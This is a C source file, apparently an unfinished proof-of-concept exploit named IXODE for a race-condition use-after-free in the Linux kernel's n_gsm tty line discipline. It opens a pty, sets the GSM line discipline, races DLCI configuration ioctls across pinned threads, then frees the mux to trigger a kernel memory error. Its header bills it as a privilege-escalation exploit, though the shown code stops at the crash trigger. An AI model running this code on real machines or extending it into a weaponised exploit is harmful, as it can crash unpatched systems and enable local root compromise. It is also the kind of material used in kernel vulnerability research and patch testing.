/*                                                                             
                                                                       eee     
                                     oooooooo                       eeeeee     
                                    ooo    oooo                  eeeee         
      iiiiiii                     oooo       oo   ddddddd       eeee           
  iiiiiii      xx           xx    ooo        ooo  dddddddddd    ee             
       ii       xxx       xxx    ooo          oo  d       ddd   ee             
       ii         xxxx  xxxx     ooo      o   oo  d         d   ee     eee     
       ii           xxxxxx       oo      oo   oo  d         d   ee  eeeee      
       ii             xxx        oo     oo    o   dd        d   eeeeee         
       ii           xxx xxx      oo    oo     o   dd       dd   eee            
       ii         xxx    xxxx    oo   oo      o   dd      dd     ee            
       ii        xx        xxx   oo          oo   ddddddddd      ee     eeee   
  iiiiiiiiii    x                ooo        ooo   ddddd          eee eeeeeeee  
     iiiii                         ooooooooooo                   eeeeeeee      
                                    ooooooo                       eee          
                                                                               
    OVERVIEW:
        IXODE is an N_GSM Linux kernel privilege escalation exploit for versions BLAH to BLEH

        Tested on:
            - Ubuntu [..]

    ASSUMPTIONS:
        - [..]

    USAGE:
        - make
        - ./ixode

    @roddux, 2024-07
*/

#define _GNU_SOURCE
#include <stdio.h>        // printf, puts
#include <stdlib.h>       // exit
#include <unistd.h>       // fork, close
#include <fcntl.h>        // open
#include <sys/ioctl.h>    // ioctl
#include <linux/gsmmux.h> // gsm tty structs, ioctls
#include <stdint.h>       // uint_xyz
#include <inttypes.h>     // for printing the above
#include <pthread.h>      // threading
#include <stdatomic.h>    // atomic types
#include <stdbool.h>      // true, false
#include <sys/sysinfo.h>  // get number of procs

// all my homies hate uintX_t
#define ptr uintptr_t
#define u64 uint64_t
#define i64  int64_t
#define u32 uint32_t
#define i32  int32_t
#define u16 uint16_t
#define  u8  uint8_t

// logging etc
#define LOG(...) printf(__VA_ARGS__)
#ifdef DEBUG
#define DBGLOG(...) LOG(__VA_ARGS__)
#else
#define DBGLOG(...) {}
#endif

// tidy syschecks
#define SYS(X) do {                                                                                  \
    i64 r=X;                                                                                         \
    if (r<0) {                                                                                       \
        LOG("\n\n[!] %s in %s, line %d: %s returns %"PRId64"\n",__FILE__,__func__,__LINE__,#X,r);    \
        exit((int)r);                                                                                \
    }                                                                                                \
} while(0)

// these are not always picked up by my compiler, so we define them here
struct gsm_dlci_config {
    u32 channel;      /* DLCI (0 for the associated DLCI) */
    u32 adaption;     /* Convergence layer type */
    u32 mtu;          /* Maximum transfer unit */
    u32 priority;     /* Priority (0 for default value) */
    u32 i;            /* Frame type (1 = UIH, 2 = UI) */
    u32 k;            /* Window size (0 for default value) */
    u32 reserved[8];  /* For future use, must be initialized to zero */
};
#define GSMIOC_GETCONF_DLCI _IOWR( 'G', 7, struct gsm_dlci_config )
#define GSMIOC_SETCONF_DLCI _IOW ( 'G', 8, struct gsm_dlci_config )

struct arg_data {
    int dev_fd;
};

static u8 NUM_CPU = 0;
atomic_bool start = false;
atomic_int ready = 0;
const int gsm_ldisc  = 21; // N_GSM0710 == 21
const int ntty_ldisc = 0;  // N_TTY     == 0

// set affinity; we gotta race and don't want to be preempted
void set_affinity(u64 cpu) {
    DBGLOG("[+] Setting affinity to cpu %"PRIu64"\n", cpu);
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    SYS(sched_setaffinity(gettid(), sizeof(set), &set));
}

// this function will perform the ioctl in a race
// we use atomics to synchronise between threads to start at the same time
void *dlci_racer(void *arg) {
    struct arg_data *dat = (struct arg_data*)arg;

    struct gsm_dlci_config x = {0};
    x.channel = 1;   // 0<N<64
    x.adaption = 2;  // 1 or 2
    x.mtu = 10;      // 7<N<1500
    x.i = 1;         // 0<N<3

    pid_t cpuid = gettid()%NUM_CPU;
    LOG("[+][%.5d] Setting racer thread affinity to CPU %d\n", gettid(), cpuid);
    set_affinity((u64)cpuid);
    
    atomic_fetch_add_explicit(&ready, 1, memory_order_relaxed); /* signal this thread is ready */
    
    LOG("[+][%.5d] Thread ready, waiting on spinlock\n", gettid());

    while(atomic_load_explicit(&start, memory_order_relaxed) == false) { /* spinlock */ };

    LOG("[+][%.5d] Thread starting, will now ioctl to setup dlci object\n", gettid());
    int ret = ioctl(dat->dev_fd, GSMIOC_SETCONF_DLCI, &x);
    LOG("[+][%.5d] ioctl returned %d\n", gettid(), ret);

    // we need to trigger need_restart or need_open to arm the timer
    // we can hit need_restart easily..:
    // if (dc->adaption != dlci->adaption) need_restart = true
    // dlci->adaption is taken from gsm->adaption,
    // so we just call SETCONF_DLCI with diff. adaption from gsm config

    return 0;
}

// set GSM config to change the mux mode
void set_gsm_config(int dev_fd, u32 timeout_sec) {
    LOG("[+][%.5d] Setting gsm timeout to %u seconds\n", gettid(), timeout_sec);

    struct gsm_config c = {0};
    c.adaption = 1;  // 1 or 2
    c.mru = 100;     // 7<N<1500
    c.mtu = 100;     // 7<N<1500
    c.i = 1;         // 0<N<3
    c.initiator = 1; // 1 or 0

    // jiffies + ( gsm->t1 * (HZ / 100) )
    c.t1 = timeout_sec*100;

    // set the configuration to tty fd
    SYS(ioctl(dev_fd, GSMIOC_SETCONF, &c));
}

// grab ourselves a tty file descriptor
int open_tty_device(char *device) {
    LOG("[+][%.5d] Opening %s\n", gettid(), device);
    const int dev_fd = open(device, O_RDWR);
    SYS(dev_fd);
    return dev_fd;
}

// set the GSM line discipline on given tty fd
void set_tty_ldisc(int dev_fd, const int *ldisc) {
    DBGLOG("[+] Setting GSM line discipline\n");
    SYS(ioctl(dev_fd, TIOCSETD, ldisc));
}

int main(int argc, char **argv) {
    char *device;
    char default_tty[] = "/dev/ptmx";

    // if /dev/ptmx isn't available (in a VM or whatever) then run with whatever term you 
    // have access to -- i.e. /dev/tty1 should work :TM:
    if (argc == 2) {
        device = argv[1];
    } else {
        device = default_tty;
    }

    NUM_CPU = (u8)get_nprocs();
    LOG("[+][%.5d] Found %u processors\n", gettid(), NUM_CPU);

    LOG("[+][%.5d] Setting main thread affinity to CPU 0\n", gettid());
    set_affinity(0);

    int dev_fd = open_tty_device(device);
    LOG("[+][%.5d] Got device file descriptor: %d\n", gettid(), dev_fd);

    set_tty_ldisc(dev_fd, &gsm_ldisc);
    LOG("[+][%.5d] Line discipline set\n", gettid());

    set_gsm_config(dev_fd, 10);
    LOG("[+][%.5d] Config set\n", gettid());

    // for good luck :^)
    sleep(3);

    pthread_t _t;
    struct arg_data args = {
        .dev_fd = dev_fd,
    };

    int n_threads = 10;
    LOG("[+][%.5d] Spawning %d threads\n", gettid(), n_threads);
    for(int i=0; i<n_threads; i++)
        pthread_create( &_t, 0, dlci_racer, (void*)&args );

    LOG("[+][%.5d] Waiting for threads to be ready\n", gettid());
    while(atomic_load_explicit(&ready, memory_order_relaxed) != n_threads) { /* spinlock */ }

    LOG("[+][%.5d] Starting threads\n", gettid());
    atomic_store_explicit(&start, true, memory_order_relaxed);

    LOG("[+][%.5d] Waiting 3 seconds for threads to complete\n", gettid());
    sleep(3);

    // while(atomic_load_explicit(&ready, memory_order_relaxed) != 0) { /* spinlock */ }

    LOG("[+][%.5d] Closing device file descriptor to free gsm_mux\n", gettid());

    close(dev_fd);

    LOG("[+][%.5d] KASAN splat soon..? Sit tight for ~5/10 seconds! :)\n", gettid());

    sleep(20);

    return 0;
}